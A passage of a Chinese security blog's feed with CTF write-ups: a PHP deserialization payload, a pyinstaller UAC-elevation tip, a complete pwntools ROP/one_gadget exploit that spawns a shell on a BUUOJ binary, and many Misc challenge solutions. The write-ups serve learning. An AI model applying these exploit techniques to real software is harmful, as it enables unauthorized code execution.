punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> O<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"create"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"ctfer"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"age"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"19"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"flag"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"yingzi"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>没什么特别的, 只是限制反序列化字符串的长度, 把用不到的属性删掉. </p><pre><code>O:6:&quot;create&quot;:2:{s:3:&quot;age&quot;;s:2:&quot;19&quot;;s:4:&quot;flag&quot;;s:6:&quot;yingzi&quot;;}</code></pre><p><img src="/images/20/6.jpg" alt></p><pre><code>flag{it_is_not_hard}</code></pre><hr><p>SELF LEARNING &amp; SHARE</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x1-get-contents&quot;&gt;&lt;a href=&quot;#0x1-get-contents&quot; class=&quot;headerlink&quot; title=&quot;0x1 get contents&quot;&gt;&lt;/a&gt;0x1 get contents&lt;/h2&gt;&lt;p&gt;进入题目看到一个&lt;code&gt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://helianthus.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://helianthus.top/tags/CTF/"/>
    
      <category term="Web" scheme="https://helianthus.top/tags/Web/"/>
    
      <category term="PHP" scheme="https://helianthus.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Pyinstaller打包py文件得到UAC权限</title>
    <link href="https://helianthus.top/2021/01/23/19-pyinstaller-get-uac-admin/"/>
    <id>https://helianthus.top/2021/01/23/19-pyinstaller-get-uac-admin/</id>
    <published>2021-01-23T09:05:17.000Z</published>
    <updated>2021-01-23T01:10:56.037Z</updated>
    
    <content type="html"><![CDATA[<ul><li>需要打包的脚本 <code>a.py</code></li></ul><p>首先第一次打包脚本 <code>a.py</code></p><pre class=" language-shell"><code class="language-shell">pyinstaller -F --uac-admin a.py</code></pre><p>然后去<code>build</code>目录找<code>a/a.exe.manifest</code>, 将其复制到<code>a.py</code>同级目录下, 再次运行</p><pre class=" language-shell"><code class="language-shell">pyinstall -F --uac-admin -r a.exe.manifest,1 a.py</code></pre><p>也就是在第一次打包基础上增加<code>-r a.exe.manifest,1</code>, 然后查看<code>dist</code>目录, 发现就是带有UAC的exe了。</p><p><img src="/images/19/uac.png" alt></p><ul><li>参考资料: <a href="https://blog.csdn.net/qq_26373925/article/details/105373124" target="_blank" rel="noopener">https://blog.csdn.net/qq_26373925/article/details/105373124</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;需要打包的脚本 &lt;code&gt;a.py&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;首先第一次打包脚本 &lt;code&gt;a.py&lt;/code&gt;&lt;/p&gt;
&lt;pre class=&quot; language-shell&quot;&gt;&lt;code class=&quot;language-shell&quot;&gt;p
      
    
    </summary>
    
    
      <category term="Python" scheme="https://helianthus.top/categories/Python/"/>
    
    
      <category term="python" scheme="https://helianthus.top/tags/python/"/>
    
      <category term="uac" scheme="https://helianthus.top/tags/uac/"/>
    
  </entry>
  
  <entry>
    <title>【CTF-PWN】ROP + One_gadget拿shell</title>
    <link href="https://helianthus.top/2020/06/20/18-buuoj-babyrop2/"/>
    <id>https://helianthus.top/2020/06/20/18-buuoj-babyrop2/</id>
    <published>2020-06-20T14:59:27.000Z</published>
    <updated>2020-06-23T15:23:23.460Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下在题目中one_gadget的使用, one_gadget永远滴神.</p><a id="more"></a><h2 id="0x01-题目地址"><a href="#0x01-题目地址" class="headerlink" title="0x01 题目地址"></a>0x01 题目地址</h2><p><a href="https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2" target="_blank" rel="noopener">https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2</a></p><h2 id="0x02-开始梭哈"><a href="#0x02-开始梭哈" class="headerlink" title="0x02 开始梭哈"></a>0x02 开始梭哈</h2><p>题目给了一个<code>babyrop2</code>和一个<code>libc.so.6</code>, 先分析一下这个<code>babyrop2</code>.</p><h5 id="babyrop2"><a href="#babyrop2" class="headerlink" title="babyrop2"></a>babyrop2</h5><p>程序就一个输入点<br><img src="/images/18/1.jpg" alt></p><p>打算使用<code>printf</code>函数泄露出<code>__libc_start_main</code>的地址. (确实没有找到合适泄露的函数, 只能这个了…)<br><img src="/images/18/2.jpg" alt></p><p>也就是要构造一个<code>printf(&quot;%s&quot;, __libc_start_main的got地址)</code><br>先找到<code>%s</code><br><img src="/images/18/3.jpg" alt></p><p>截取到<code>%s</code>开始, 也就是<br><img src="/images/18/4.jpg" alt></p><p><code>__libc_start_main</code>的<code>got</code>就不用多说了.</p><p>接下来从<code>libc.so.6</code>里面得到一些信息</p><h5 id="libc-so-6"><a href="#libc-so-6" class="headerlink" title="libc.so.6"></a>libc.so.6</h5><p>我们要从这个文件中得到<code>one_gadget</code>, 需要借助一个工具, 就叫<code>one_gadget</code>.<br><img src="/images/18/5.jpg" alt></p><p><code>one_gadget</code>是什么呢? 就是我们以往做<code>ROP</code>需要泄露地址然后拿到真实的<code>system</code>函数以及<code>bin_sh</code>字符串的地址构造<code>ROP</code>, 但是当有了<code>one_gadget</code>, 就可以直接返回到这个地址拿到<code>shell</code>.</p><h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./babyrop2"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># p = remote("node3.buuoj.cn", 29305)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./babyrop2"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc<span class="token comment" spellcheck="true"># var</span>overflow <span class="token operator">=</span> <span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">8</span>format_string <span class="token operator">=</span> <span class="token number">0x400790</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x0000000000400733</span>pop_rsi_r15 <span class="token operator">=</span> <span class="token number">0x0000000000400731</span>printf_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>libc_start_main_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"__libc_start_main"</span><span class="token punctuation">]</span>main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflowpayload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>format_string<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_r15<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_start_main_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>printf_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>leak_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"libc_start_main: {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> leak_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__libc_start_main"</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflowpayload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x45216</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/images/18/6.jpg" alt></p><p>emm, 这题目<code>flag</code>竟然没放到根目录, 还要找一下才可以QAQ</p><p><code>flag{23d424ad-f38b-4a47-a60f-41ca5c19fb88}</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录一下在题目中one_gadget的使用, one_gadget永远滴神.&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://helianthus.top/categories/CTF/"/>
    
    
      <category term="pwn" scheme="https://helianthus.top/tags/pwn/"/>
    
      <category term="rop" scheme="https://helianthus.top/tags/rop/"/>
    
  </entry>
  
  <entry>
    <title>BUUOJ CTF Misc题目WriteUP</title>
    <link href="https://helianthus.top/2020/06/03/17-buuoj-misc-writeup/"/>
    <id>https://helianthus.top/2020/06/03/17-buuoj-misc-writeup/</id>
    <published>2020-06-02T18:23:47.000Z</published>
    <updated>2020-07-02T07:11:37.834Z</updated>
    
    <content type="html"><![CDATA[<p>BUUOJ CTF, 日常刷题记录, 包含题目flag, 以及使用的脚本. </p><p>这是关于<code>杂项题目</code>的WP, 之前写过<code>密码学</code>的WP, 如果有需要可以转到<a href="/2019/12/03/8-BUUCTF-Crypto-WriteUP/">BUUCTF 密码学思路</a></p><a id="more"></a><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>emm, 直接给flag了。<br><code>flag{buu_ctf}</code></p><h2 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h2><p>是一个<code>gif</code>,  可以通过网站分解, 也可以自己写个脚本.</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">if</span> <span class="token string">"images"</span> <span class="token operator">not</span> <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">"images"</span><span class="token punctuation">)</span>img <span class="token operator">=</span> Image<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">"aaa.gif"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        img<span class="token punctuation">.</span>seek<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        img<span class="token punctuation">.</span>save<span class="token punctuation">(</span>f<span class="token string">"images/{i}.png"</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><p><img src="/images/17/1.jpg" alt><br><code>flag{he11ohongke}</code></p><h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><p>打开之后扫描, 结果是<code>secret is here</code>, 并没啥用处.<br>扔进<code>binwalk</code>直接分离, 得到了一个有密码的压缩包, 压缩包内的文件名叫<code>4number.txt</code>, 也就是密码是长度为4的纯数字！  直接开始爆破.<br>得到密码<code>7639</code><br><code>flag{vjpw_wnoei}</code></p><h2 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h2><p>下载下来是个<code>.exe</code>的windows可执行文件, 但是双击并不能运行, 使用<code>notepad++</code>打开发现是<code>Data URI scheme</code>, 直接本地建一个<code>.html</code>文件  </p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>data:......<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><p>然后双击打开就可以看到一个<code>二维码</code>, 扫描就可得到<code>flag</code>.<br><code>flag{dca57f966e4e4e31fd5b15417da63269}</code></p><h2 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h2><p>打开图片看到大白的下半身不见了, 图片格式是<code>png</code>, 通过题目的提示<code>看不到图？ 是不是屏幕太小了</code>, 基本可以判断是通过修改高度来显示出来大白的下半身得到flag.<br><img src="/images/17/2.png" alt><br>将原本的<code>01 00</code>改成<code>04 00</code>, 即可显示出下半身.<br><code>flag{He1l0_d4_ba1}</code></p><h2 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h2><p>题目提到了是<code>四位数字加密</code>, 直接爆破.<br>密码是: <code>2563</code>, 解开之后是个<code>base64</code>, 解码一下就可以.<br><code>flag{70354300a5100ba78068805661b93a5c}</code></p><h2 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h2><p>一个图片, 使用<code>notepad++</code>打开, 按<code>ctrl + end</code>直接跳转到最后一行, 可以看到flag<br><code>flag{stego_is_s0_bor1ing}</code></p><h2 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h2><p>和头上一道题一样的操作步骤.<br><code>flag{97314e7864a8f62627b26f3f998c37f1}</code></p><h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><p>看到LSB, 我直接开启了<code>Stegsolve.jar</code><br><img src="/images/17/3.jpg" alt><br>可以看到最低位隐写了一个PNG文件, savebin下来. 看到是一个二维码, 扫码得到flag<br><code>flag{1sb_i4_s0_Ea4y}</code></p><h2 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h2><p>题目提示是<code>rar的密码是4位纯数字</code>, 爆破得到密码<code>8795</code>, 解压得到flag<br><code>flag{1773c5da790bd3caff38e3decd180eb7}</code></p><h2 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h2><p>得到一个二维码, 扫码直接得到flag<br><code>flag{878865ce73370a4ce607d21ca01b5e59}</code></p><h2 id="文件中的秘密"><a href="#文件中的秘密" class="headerlink" title="文件中的秘密"></a>文件中的秘密</h2><p>图片右键属性就可以看到flag<br><img src="/images/17/4.jpg" alt><br><code>flag{870c5a72806115cb5439345d8b014396}</code></p><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><p>题目提示是<code>登陆网站的一段流量包</code>, 那么直接打开<code>wireshark</code>过滤出<code>http</code>协议.<br><img src="/images/17/5.jpg" alt><br><code>flag{ffb7567a1d4f4abdffdb54e022f8facd}</code></p><h2 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h2><p>通过<code>notepad++</code>看到最后有类似<code>ningen.txt</code>, 扔进<code>binwalk</code>分离出了一个<code>zip</code>文件, 文件有密码, 通过题目提示<code>知道了秋明特别讨厌中国的六位银行密码，喜欢四位数。</code><br>那就是四位的纯数字, 爆破就好了, 得到密码<code>8368</code>, 解压得到flag<br><code>flag{b025fc9ca797a67d2103bfbc407a6d5f}</code></p><h2 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h2><p>使用<code>winHex</code>打开, 修改<code>09 00</code>为<code>00 00</code>, 再次进行解压, 得到flag<br><code>flag{Adm1N-B2G-kU-SZIP}</code></p><h2 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h2><p>一开始没分析出来, 看了看图片名… steg? stegsolve?????  哦?… 使用<code>Stegsolve.jar</code>打开.<br><img src="/images/17/6.jpg" alt><br>哦. 还真是啊, 那没事了.<br><code>flag{st3g0_saurus_wr3cks}</code></p><h2 id="小明的保险箱"><a href="#小明的保险箱" class="headerlink" title="小明的保险箱"></a>小明的保险箱</h2><p>其实就是套娃题目, <code>binwalk</code>分离出压缩包, 爆破出4位数字, 得到flag<br>压缩包密码<code>7869</code><br><code>flag{75a3d68bf071ee188c418ea6cf0bb043}</code></p><h2 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h2><p>wireshark, <code>tcp.stream eq 2</code>, 追踪tcp流, 即可找到flag<br><img src="/images/17/7.jpg" alt><br><code>flag{da73d88936010da1eeeb36e945ec4b97}</code></p><h2 id="爱因斯坦"><a href="#爱因斯坦" class="headerlink" title="爱因斯坦"></a>爱因斯坦</h2><p>得到图片, 右键查看属性, 得到一条<code>this_is_not_password</code><br><code>binwalk</code>分离出了一个压缩包, 有密码, 不知道密码怎么办呢? 那就试试上面这条吧.<br>压缩包密码: <code>this_is_not_password</code>, 解压缩得到flag, sb题目.<br><code>flag{dd22a92bf2cceb6c0cd0d6b83ff51606}</code></p><h2 id="easycap"><a href="#easycap" class="headerlink" title="easycap"></a>easycap</h2><p>是个流量包, wireshark打开直接追踪tcp流, ….嗯..直接就是flag<br><code>flag{385b87afc8671dee07550290d16a8071}</code></p><h2 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h2><p>给了一个带有密码的压缩包和一张图片, 图片下面是盲文, 直接从网上找个图片挨个对照, 得到压缩包密码<code>kmdonowg</code><br>解压得到一个音频文件, 听声音是摩斯电码, 通过<code>Audacity</code>可以看到音频长短, 然后去解密, 得到flag<br><code>flag{wpei08732?23dz}</code></p><h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><p>通过<code>StegSolve.jar</code>得到了一个zip<br><img src="/images/17/8.jpg" alt><br>savebin后, 解压, 得到一个elf文件, 直接通过<code>notepad++</code>搜索<code>ctf</code>关键字, 就可以看到flag<br><code>flag{dd0gf4c3tok3yb0ard4g41n~~~}</code></p><h2 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h2><p>一张图片, 通过<code>notepad++</code>打开之后, 最后有一段神秘的二进制<code>01101011011011110110010101101011011010100011001101110011</code>, 把二进制转化为字符串, 得到flag<br><code>flag{koekj3s}</code></p><h2 id="隐藏的钥匙"><a href="#隐藏的钥匙" class="headerlink" title="隐藏的钥匙"></a>隐藏的钥匙</h2><p>通过<code>notepad++</code>打开, 搜索<code>flag</code><br><img src="/images/17/9.jpg" alt><br>bas64解码得到flag<br><code>flag{377cbadda1eca2f2f73d36277781f00a}</code></p><h2 id="荷兰宽带数据泄露"><a href="#荷兰宽带数据泄露" class="headerlink" title="荷兰宽带数据泄露"></a>荷兰宽带数据泄露</h2><p>工具 + 猜谜题目, 没工具就做不出来, 工具名: <code>RouterPassView</code><br><img src="/images/17/10.jpg" alt><br>没错, 用户名就是flag<br><code>flag{053700357621}</code></p><h2 id="BJDCTF-2nd-最简单的misc-y1ng"><a href="#BJDCTF-2nd-最简单的misc-y1ng" class="headerlink" title="[BJDCTF 2nd]最简单的misc-y1ng"></a>[BJDCTF 2nd]最简单的misc-y1ng</h2><p><code>notepad++</code>打开, 发现了一段16进制字符串<code>424A447B79316E677A756973687561697D</code><br><img src="/images/17/11.jpg" alt></p><p><code>HEX</code>转<code>ASCII</code>, 得到flag<br><code>flag{y1ngzuishuai}</code></p><h2 id="后门查杀"><a href="#后门查杀" class="headerlink" title="后门查杀"></a>后门查杀</h2><p>直接<code>D盾</code>扫描, 木马文件在<code>/include/include.php</code>, 得到flag<br><code>flag{6ac45fb83b3bc355c024f5034b947dd3}</code></p><h2 id="BJDCTF-2nd-A-Beautiful-Picture"><a href="#BJDCTF-2nd-A-Beautiful-Picture" class="headerlink" title="[BJDCTF 2nd]A_Beautiful_Picture"></a>[BJDCTF 2nd]A_Beautiful_Picture</h2><p><code>png</code>文件, 修改图片高度, 得到flag<br><code>flag{Png_He1ghT_1s_WR0ng}</code></p><h2 id="来首歌吧"><a href="#来首歌吧" class="headerlink" title="来首歌吧"></a>来首歌吧</h2><p>没错, 是首歌, 一开始左声道没声音, 音乐到中间的时候, 左声道响起了摩斯电码…<br>使用<code>Audacity</code>进行分析即可得到摩斯, 解码摩斯得到flag  (flag要大写)<br><code>flag{5BC925649CB0188F52E617D70929191C}</code></p><h2 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h2><p>根据题目提示, 4位数字, 先爆破, 密码为<code>5463</code>, 解压看到了<code>BrainFuck</code>, <a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">在线转码</a><br><code>flag{e4bbef8bdf9743f8bf5b727a9f6332a8}</code></p><h2 id="九连环"><a href="#九连环" class="headerlink" title="九连环"></a>九连环</h2><p><code>binwalk</code>得到了一个图片和压缩包, 压缩包有密码, 只能从图片入手了, 这里要用到一个工具<code>stgehide</code>, 从图片提取出了一个txt, 内容是..</p><pre class=" language-text"><code class="language-text">看到这个图片就是压缩包的密码：bV1g6t5wZDJif^J7</code></pre><p>解压, 得到flag<br><code>flag{1RTo8w@&amp;4nK@z*XL}</code></p><h2 id="BJDCTF-2nd-小姐姐-y1ng"><a href="#BJDCTF-2nd-小姐姐-y1ng" class="headerlink" title="[BJDCTF 2nd]小姐姐-y1ng"></a>[BJDCTF 2nd]小姐姐-y1ng</h2><p>通过<code>notepad++</code>的正则匹配搜索<code>{(.*?)}</code>, 找到了flag<br><img src="/images/17/12.jpg" alt><br><code>flag{haokanma_xjj}</code></p><h2 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h2><p>通过<code>binwalk</code>分离出了一个<code>cipher</code>和<code>key</code><br>key: 是一个base64, 解码得到<code>What is Nicki Minaj&#39;s favorite song that refers to snakes?</code> 答案是…<code>anaconda</code><br>cipher:  需要使用<a href="http://serpent.online-domain-tools.com/" target="_blank" rel="noopener">在线工具</a><br><img src="/images/17/13.jpg" alt><br><code>flag{who_knew_serpent_cipher_existed}</code></p><h2 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h2><p>通过<code>binwalk</code>得到了一个<code>flag.vmdk</code>, emm? 虚拟机文件? 直接通过<code>7zip</code>解压开, 得到了一段<code>brainfuck</code>, 解码得<code>flag{N7F5_AD5</code>, 还少了一半…<br>另一半通过</p><pre class=" language-shell"><code class="language-shell">strings flag.vmdk</code></pre><p>找到了一堆<code>ook</code>,<br><img src="/images/17/14.jpg" alt><br>解码得到<code>_i5_funny!}</code>, so? 拼接得到最后的flag<br><code>flag{N7F5_AD5_i5_funny!}</code></p><h2 id="webshell后门"><a href="#webshell后门" class="headerlink" title="webshell后门"></a>webshell后门</h2><p><code>D盾</code>直接扫描, 后门文件是<code>/member/zp.php</code>.<br><code>flag{ba8e6c6f35a53933b871480bb9a9545c}</code></p><h2 id="梅花香之苦寒来"><a href="#梅花香之苦寒来" class="headerlink" title="梅花香之苦寒来"></a>梅花香之苦寒来</h2><p>通过<code>notepad++</code>打开图片, 翻着翻着看到一堆hex, 复制一小部分拿去解码, 发现是类似与坐标的东西. 直接自己写个脚本搞出来.</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token comment" spellcheck="true"># 通过坐标的最大值数字 + 1计算出来的.</span>width <span class="token operator">=</span> <span class="token number">272</span>height <span class="token operator">=</span> <span class="token number">272</span>img <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"RGB"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>width<span class="token punctuation">,</span> height<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"white"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># cipher文件就是那一堆hex</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"cipher"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>    data <span class="token operator">=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    temp <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        strHex <span class="token operator">=</span> <span class="token string">"0x"</span> <span class="token operator">+</span> data<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span>        decResult <span class="token operator">=</span> int<span class="token punctuation">(</span>strHex<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>        item <span class="token operator">=</span> chr<span class="token punctuation">(</span>decResult<span class="token punctuation">)</span>        <span class="token keyword">if</span> decResult <span class="token operator">==</span> <span class="token number">10</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span>            x <span class="token operator">=</span> temp<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"("</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">")"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            y <span class="token operator">=</span> temp<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"("</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">")"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>            img<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>int<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span>int<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            temp <span class="token operator">=</span> <span class="token string">""</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            temp <span class="token operator">+=</span> item    img<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>执行完毕后生成了一个二维码</p><p><img src="/images/17/15.jpg" alt></p><p>得到flag<br><code>flag{40fc0a979f759c8892f4dc045e28b820}</code></p><h2 id="数据包中的线索"><a href="#数据包中的线索" class="headerlink" title="数据包中的线索"></a>数据包中的线索</h2><p>wireshark打开看到了一个<code>fenxi.php</code>的包,  很多base64, 直接<a href="https://codebeautify.org/base64-to-image-converter" target="_blank" rel="noopener">Base64 To Image</a><br>即可看到flag<br><code>flag{209acebf6324a09671abc31c869de72c}</code></p><h2 id="刷新过的图片"><a href="#刷新过的图片" class="headerlink" title="刷新过的图片"></a>刷新过的图片</h2><p>根据题目, <code>刷新</code>  <code>F5</code>, 一定是F5隐写, 直接使用工具(F5-steganography-james)就可以解出一个<code>zip</code>文件, 然后直接解压得到flag<br><code>flag{96efd0a2037d06f34199e921079778ee}</code></p><h2 id="被劫持的神秘礼物"><a href="#被劫持的神秘礼物" class="headerlink" title="被劫持的神秘礼物"></a>被劫持的神秘礼物</h2><p>直接<code>FOLLOW TCP STREAM</code><br><img src="/images/17/16.jpg" alt><br>flag就是<code>adminaadminb</code>的小写md5</p><p><code>flag{1d240aafe21a86afc11f38a45b541a49}</code></p><h2 id="BJDCTF-2nd-EasyBaBa"><a href="#BJDCTF-2nd-EasyBaBa" class="headerlink" title="[BJDCTF 2nd]EasyBaBa"></a>[BJDCTF 2nd]EasyBaBa</h2><p>文件很大, 绝对不一般, 扔进<code>binwalk</code>, 看到一个<code>zip</code>, 